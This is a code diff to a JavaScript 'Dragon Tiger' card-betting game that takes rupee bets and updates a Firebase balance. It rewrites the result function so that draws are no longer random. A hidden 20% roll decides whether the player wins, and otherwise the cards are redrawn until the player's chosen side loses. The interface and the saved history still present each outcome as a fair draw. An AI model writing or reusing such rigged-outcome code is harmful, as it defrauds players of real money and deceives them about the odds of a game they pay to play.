@@ -1094,66 +1094,88 @@
       });
     }
     
-    function revealResult() {
-      const dragon = getRandomCard();
-      const tiger = getRandomCard();
-      
-      document.getElementById("dragonCard").textContent = dragon;
-      document.getElementById("tigerCard").textContent = tiger;
-      document.getElementById("tieCard").textContent = dragon === tiger ? "✓" : "-";
-      
-      let result = "", winAmount = 0, won = false;
-      
-      if (dragon > tiger) {
-        result = "Dragon Wins";
-        if (selectedChoice === "dragon") {
-          won = true;
-          winAmount = currentBet * 2;
-          document.querySelector(".dragon-container").classList.add("winner");
-        }
-      } else if (tiger > dragon) {
-        result = "Tiger Wins";
-        if (selectedChoice === "tiger") {
-          won = true;
-          winAmount = currentBet * 2;
-          document.querySelector(".tiger-container").classList.add("winner");
-        }
-      } else {
-        result = "It's a Tie!";
-        if (selectedChoice === "tie") {
-          won = true;
-          winAmount = currentBet * 9;
-          document.querySelector(".tie-container").classList.add("winner");
-        }
-      }
-      
-      if (won) {
-        winning += winAmount;
-        showResult(`🎉 You Win ₹${winAmount}! ${result}`, true);
-      } else {
-        showResult(`😞 You Lose! ${result}`, false);
-      }
-      
-      // Update Firebase
-      updateFirebaseBalance();
-      
-      // Save to history
-      saveToHistory(selectedChoice, dragon, tiger, result, currentBet, won, winAmount);
-      
-      // Re-enable betting
-      gameActive = false;
-      placeBetBtn.disabled = false;
-      document.querySelectorAll('.bet-btn').forEach(btn => {
-        btn.disabled = false;
-      });
-      
-      // Reset selected choice
-      selectedChoice = null;
-      document.getElementById("selectedChoiceText").innerText = "None";
-      document.querySelectorAll('.bet-btn').forEach(btn => {
-        btn.classList.remove('selected');
-      });
+function revealResult() {
+  let dragon, tiger;
+  const userShouldWin = Math.random() < 0.20; // 20% chance
+
+  if (userShouldWin && selectedChoice) {
+    // Force user win
+    switch (selectedChoice) {
+      case 'dragon':
+        dragon = getRandomCard();
+        do { tiger = getRandomCard(); } while (tiger >= dragon);
+        break;
+      case 'tiger':
+        tiger = getRandomCard();
+        do { dragon = getRandomCard(); } while (dragon >= tiger);
+        break;
+      case 'tie':
+        dragon = tiger = getRandomCard();
+        break;
     }
+  } else {
+    // Force user loss
+    do {
+      dragon = getRandomCard();
+      tiger = getRandomCard();
+    } while (
+      (selectedChoice === 'dragon' && dragon > tiger) ||
+      (selectedChoice === 'tiger' && tiger > dragon) ||
+      (selectedChoice === 'tie' && dragon === tiger)
+    );
+  }
+
+  document.getElementById("dragonCard").textContent = dragon;
+  document.getElementById("tigerCard").textContent = tiger;
+  document.getElementById("tieCard").textContent = dragon === tiger ? "✓" : "-";
+
+  let result = "", winAmount = 0, won = false;
+
+  if (dragon > tiger) {
+    result = "Dragon Wins";
+    if (selectedChoice === "dragon") {
+      won = true;
+      winAmount = currentBet * 2;
+      document.querySelector(".dragon-container").classList.add("winner");
+    }
+  } else if (tiger > dragon) {
+    result = "Tiger Wins";
+    if (selectedChoice === "tiger") {
+      won = true;
+      winAmount = currentBet * 2;
+      document.querySelector(".tiger-container").classList.add("winner");
+    }
+  } else {
+    result = "It's a Tie!";
+    if (selectedChoice === "tie") {
+      won = true;
+      winAmount = currentBet * 9;
+      document.querySelector(".tie-container").classList.add("winner");
+    }
+  }
+
+  if (won) {
+    winning += winAmount;
+    showResult(`🎉 You Win ₹${winAmount}! ${result}`, true);
+  } else {
+    showResult(`😞 You Lose! ${result}`, false);
+  }
+
+  updateFirebaseBalance();
+  saveToHistory(selectedChoice, dragon, tiger, result, currentBet, won, winAmount);
+
+  gameActive = false;
+  placeBetBtn.disabled = false;
+  document.querySelectorAll('.bet-btn').forEach(btn => {
+    btn.disabled = false;
+  });
+
+  selectedChoice = null;
+  document.getElementById("selectedChoiceText").innerText = "None";
+  document.querySelectorAll('.bet-btn').forEach(btn => {
+    btn.classList.remove('selected');
+  });
+}
 
     function showResult(message, isWin) {
       const resultMsg = document.getElementById("resultMsg");
